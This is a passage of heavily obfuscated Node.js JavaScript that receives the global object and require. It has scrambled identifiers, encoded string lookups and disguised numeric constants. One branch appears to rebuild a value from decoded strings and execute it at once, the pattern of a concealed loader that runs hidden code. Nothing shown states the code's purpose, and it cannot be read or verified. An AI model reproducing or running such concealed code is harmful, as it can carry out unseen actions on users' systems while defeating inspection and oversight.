CidrsspxlceMfHRKwoKLxAAu=YXxpDhvVz_fpjazJgb$B[Ng_FPzxZoKZ$tgmLjspxPJPvE(0x17f)](peel,YXxpDhvVz_fpjazJgb$B[Ng_FPzxZoKZ$tgmLjspxPJPvE(0x175)]),RyS$yl$AXT=peel[CidrsspxlceMfHRKwoKLxAAu[Ng_FPzxZoKZ$tgmLjspxPJPvE(0x165)](-parseInt(0x847)*-0x1+-parseInt(0x1e71)+-parseInt(0xb15)*-parseInt(0x2),Math.trunc(parseInt(0x72f))*0x1+parseInt(0x3)*parseInt(0x151)+parseFloat(-parseInt(0xb17)))],YojDIqmHYJmrA$gqksQOG=YXxpDhvVz_fpjazJgb$B[Ng_FPzxZoKZ$tgmLjspxPJPvE(0x163)](RyS$yl$AXT,'',YXxpDhvVz_fpjazJgb$B[Ng_FPzxZoKZ$tgmLjspxPJPvE(0x161)](peel,Ng_FPzxZoKZ$tgmLjspxPJPvE(0x160)));continue;case'2':CWeMLuwxwDnnMepW['z']=z;continue;case'3':YXxpDhvVz_fpjazJgb$B[Ng_FPzxZoKZ$tgmLjspxPJPvE(0x163)](RyS$yl$AXT,'',YXxpDhvVz_fpjazJgb$B[Ng_FPzxZoKZ$tgmLjspxPJPvE(0x162)](YojDIqmHYJmrA$gqksQOG,YXxpDhvVz_fpjazJgb$B[Ng_FPzxZoKZ$tgmLjspxPJPvE(0x17e)](peel,YXxpDhvVz_fpjazJgb$B[Ng_FPzxZoKZ$tgmLjspxPJPvE(0x169)])))(0x243d+-0x7f2*-parseInt(0x4)+parseFloat(0x51)*-parseInt(0xb8));continue;case'4':CWeMLuwxwDnnMepW[OZdYyvbd_ijOD[0x4*-0x9a9+-0x1a2a+-parseInt(0x18b)*Number(-parseInt(0x2a))]]=UcHRPEuBhQnEqYotJUNCGrA,YXxpDhvVz_fpjazJgb$B[Ng_FPzxZoKZ$tgmLjspxPJPvE(0x17d)](typeof module,OZdYyvbd_ijOD[Number(-parseInt(0x3d))*-parseInt(0x1d)+0x2*Number(-0xccd)+parseInt(parseInt(0x12b2))])&&(CWeMLuwxwDnnMepW[OZdYyvbd_ijOD[parseFloat(parseInt(0x1))*-0x24a0+parseFloat(-0x1a0a)+0x3eac]]=module);continue;}break;}}(global,require);
